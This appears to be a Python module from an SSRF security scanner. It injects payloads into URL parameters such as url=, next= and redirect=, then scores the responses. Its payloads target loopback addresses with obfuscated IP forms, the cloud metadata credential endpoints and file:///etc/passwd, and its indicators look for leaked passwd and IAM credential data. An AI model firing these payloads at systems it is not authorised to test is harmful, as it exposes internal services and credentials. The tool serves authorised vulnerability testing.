"""SSRF reachable through URL parameters."""

import time
from urllib.parse import parse_qs, urlencode, urlparse

from colorama import Fore

from .base import BaseTest

class URLParameterTest(BaseTest):
    """Detect SSRF reachable through URL parameters (url=, next=, ...)."""

    test_type = "URL Parameter SSRF"

    PARAMS = ["url", "next", "redirect", "dest", "destination", "uri", "path"]
    INDICATORS = {
        "root:x:0:0:": 5,
        "ami-id": 4,
        "iam/security-credentials": 5,
        "connection refused": 2,
        "permission denied": 2,
        "failed to connect": 2,
    }

    def generate_payloads(self):
        payloads = [
            "http://127.0.0.1", "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://[::1]", "http://0x7f000001", "http://2130706433",
            "http://0177.0.0.01", "http://127.0.0.1:8080",
            "http://example.com@127.0.0.1", "file:///etc/passwd",
        ]
        if self.oob_manager:
            payloads.append(self.oob_manager.url("param"))
        elif self.oob_domain:
            payloads.append(f"http://{self.oob_domain.strip('/')}")
        return payloads

    def get_baseline_response(self):
        return self._request_with_params({p: "http://example.com" for p in self.PARAMS})

    def _request_with_params(self, values):
        parsed = urlparse(self.target_url)
        query = parse_qs(parsed.query)
        query.update(values)
        new_query = urlencode(query, doseq=True)
        url = parsed._replace(query=new_query).geturl()
        return self.request("GET", url=url)

    def run(self):
        self.baseline_response = self.get_baseline_response()
        if self.baseline_response is None:
            print(Fore.YELLOW + "Baseline request failed; skipping URL parameter test.")
            self.skip("the target did not answer the baseline request")
            return
        payloads = self.generate_payloads()
        test_cases = [
            (method, param, payload)
            for method in self.methods
            for payload in payloads
            for param in self.PARAMS
        ]
        self.run_pool(self.worker, test_cases, "URL Parameter SSRF Testing")

    def worker(self, method, param_name, payload):
        parsed = urlparse(self.target_url)
        query = parse_qs(parsed.query)
        query[param_name] = payload
        url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
        start = time.time()
        response = self.request(method, url=url)
        if response is None:
            return
        elapsed = time.time() - start
        if not self.is_response_different(response):
            return
        analysis = self.analyze_response(response)
        if analysis:
            self.record({
                "url": response.url,
                "method": method,
                "param_name": param_name,
                "payload": payload,
                "status_code": response.status_code,
                "response_time": elapsed,
                "analysis": analysis,
            })

    def is_response_different(self, response):
        base = self.baseline_response
        if base.status_code != response.status_code:
            return True
        base_len = len(base.content) or 1
        if abs(base_len - len(response.content)) > 0.1 * base_len:
            return True
        return False

    def analyze_response(self, response):
        text = (response.text or "").lower()
        score = 0
        notes = []
        for indicator, weight in self.INDICATORS.items():
            if indicator in text:
                score += weight
                notes.append(f"Indicator '{indicator}' (weight {weight}).")
        if response.status_code >= 500:
            score += 1
            notes.append(f"Server error status: {response.status_code}.")
        return " ".join(notes) if score >= 5 else None
